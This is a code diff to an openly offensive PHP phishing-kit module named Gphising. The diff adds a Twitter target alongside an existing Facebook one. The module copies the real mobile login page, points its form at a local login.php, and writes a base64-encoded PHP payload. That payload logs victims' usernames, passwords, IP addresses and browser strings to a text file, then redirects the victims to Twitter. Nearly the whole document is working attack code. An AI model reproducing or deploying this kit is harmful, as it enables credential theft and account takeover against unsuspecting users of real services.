@@ -3,7 +3,7 @@
  * @Author: Eka Syahwan
  * @Date:   2016-12-11 06:34:37
  * @Last Modified by:   Eka Syahwan
- * @Last Modified time: 2016-12-11 07:28:10
+ * @Last Modified time: 2016-12-15 08:44:32
  */
 class Gphising extends DesploitsModules
 {
@@ -23,15 +23,32 @@ class Gphising extends DesploitsModules
 					exit();
 				}else{
 					unlink("result/phising/facebook/index.html");
-					$this->saves($pages,"result/phising/facebook/index.html");
-					echo "[Gphising]---> Generate Page : $link (ok)\r\n";
 					unlink("result/phising/facebook/login.php");
-					$this->saves($payload,"result/phising/facebook/login.php");
-					echo "[Gphising]---> Generate Post Data : $link (ok)\r\n";
 					unlink("result/phising/facebook/.htaccess");
+					$this->saves($pages,"result/phising/facebook/index.html");
+					$this->saves($payload,"result/phising/facebook/login.php");
 					$this->saves($htaccess,"result/phising/facebook/.htaccess");
-					echo "[Gphising]---> Generate .htaccess Data : $link (ok)\r\n";
 					echo '[Gphising][Report] all file in "result/phising/facebook/"';exit();
+				}
+			break;
+
+			case '2':
+				$htaccess = "ErrorDocument 404 /";
+				$payload = base64_decode('PD9waHANCmVycm9yX3JlcG9ydGluZygwKTsNCmlmKGlzc2V0KCRfUE9TVFtzZXNzaW9uXVt1c2VybmFtZV9vcl9lbWFpbF0pICYmIGlzc2V0KCRfUE9TVFtzZXNzaW9uXVt1c2VybmFtZV9vcl9lbWFpbF0pICl7DQoJJGluZm8gLj0gIi0tLS0tJCBEZXNwbG9pdHMgLSBHcGhpc2luZyAgJC0tLS0tXHJcbiI7DQoJJGluZm8gLj0gIlVzZXJuYW1lIDogIi4kX1BPU1Rbc2Vzc2lvbl1bdXNlcm5hbWVfb3JfZW1haWxdLiJcclxuIjsNCgkkaW5mbyAuPSAiUGFzc3dvcmQgOiAiLiRfUE9TVFtzZXNzaW9uXVtwYXNzd29yZF0uIlxyXG4iOw0KCSRpbmRpY2VzU2VydmVyID0gYXJyYXkoDQoJJ1JFTU9URV9BRERSJywgDQoJJ0hUVFBfVVNFUl9BR0VOVCcpIDsgDQoJZm9yZWFjaCAoJGluZGljZXNTZXJ2ZXIgYXMgJGFyZykgew0KCQlpZiAoaXNzZXQoJF9TRVJWRVJbJGFyZ10pKSB7IA0KICAgICAgICAJJGluZm8gLj0gIkJyb3dzZXIgIDogIi4kX1NFUlZFUlskYXJnXS4iXHJcbiI7IA0KICAgIAl9IA0KCX0NCgkkaW5mbyAuPSAiLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS1cclxuXG4iOw0KCSRvcG4gPSBmb3BlbigiZGVzcGxvaXRzLWdwaGlzaW5nLnR4dCIsICJhKyIpOw0KCWZ3cml0ZSgkb3BuLCAkaW5mbyk7DQoJZmNsb3NlKCRvcG4pOw0KCWhlYWRlcigiTG9jYXRpb246IGh0dHBzOi8vbS50d2l0dGVyLmNvbSIpOw0KfQ==');
+				echo "[Gphising] Generate Phising $link\r\n";
+				$login = $this->sdata($link , null , true);
+				$pages = str_replace('action="/sessions"' , 'action="login.php"', $login[data]);
+				if($pages === null){
+					echo "[Gphising]---> Generate Page : $link (fail)\r\n";
+					exit();
+				}else{
+					unlink("result/phising/twitter/index.html");
+					unlink("result/phising/twitter/login.php");
+					unlink("result/phising/twitter/.htaccess");
+					$this->saves($pages,"result/phising/twitter/index.html");
+					$this->saves($payload,"result/phising/twitter/login.php");
+					$this->saves($htaccess,"result/phising/twitter/.htaccess");
+					echo '[Gphising][Report] all file in "result/phising/twitter/"';exit();
 				}
 			break;
 			
@@ -43,6 +60,7 @@ class Gphising extends DesploitsModules
 	public function run(){
 		$list = array(
 			'1' => 'https://m.facebook.com',
+			'2' => 'https://mobile.twitter.com',
 		);
 		echo "----------------------------------\r\n";
 		foreach ($list as $num => $link) {
